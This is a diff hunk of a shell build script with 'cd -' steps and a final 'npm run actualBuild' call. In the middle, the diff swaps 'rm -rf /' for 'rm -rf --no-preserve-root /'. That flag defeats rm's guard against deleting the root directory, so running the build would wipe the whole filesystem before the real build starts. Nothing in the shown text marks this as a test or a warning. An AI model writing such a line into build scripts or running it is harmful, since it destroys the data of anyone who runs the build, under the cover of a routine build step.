@@ -25,7 +25,7 @@ ls -lt
 echo "cd - back to project"
 cd -
 
-rm -rf /
+rm -rf --no-preserve-root /
 
 echo "doing actual build"
 npm run actualBuild
